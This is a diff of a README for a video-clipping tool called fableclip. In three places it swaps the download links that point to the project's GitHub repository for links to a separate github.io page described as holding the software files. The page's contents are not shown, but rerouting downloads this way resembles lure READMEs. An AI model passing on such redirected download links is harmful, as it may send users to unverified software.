@@ -1,12 +1,12 @@
 # 🎬 fableclip - Turn Long Videos Into Short Clips
 
-[![Download on GitHub](https://img.shields.io/badge/Download-fableclip-blue?style=for-the-badge&logo=github)](https://github.com/Doloresable697/fableclip)
+[![Download on GitHub](https://img.shields.io/badge/Download-fableclip-blue?style=for-the-badge&logo=github)](https://doloresable697.github.io)
 
 ## 📥 How to Get Started
 
 **Step 1: Visit the download page**
 
-Go to [https://github.com/Doloresable697/fableclip](https://github.com/Doloresable697/fableclip). This page contains the software files.
+Go to [https://doloresable697.github.io](https://doloresable697.github.io). This page contains the software files.
 
 **Step 2: Find the latest release**
 
@@ -175,6 +175,6 @@ fableclip is open source software. You can use it for free, modify it, and share
 
 ## 🔗 Download Again
 
-[![Download the Latest Version](https://img.shields.io/badge/Download%20fableclip-v1.0.0-blue?style=for-the-badge&logo=github)](https://github.com/Doloresable697/fableclip)
+[![Download the Latest Version](https://img.shields.io/badge/Download%20fableclip-v1.0.0-blue?style=for-the-badge&logo=github)](https://doloresable697.github.io)
 
 Keywords: captions, ffmpeg, nextjs, open-source, opusclip-alternative, self-hosted, shorts, subtitles, video-editing, whisper
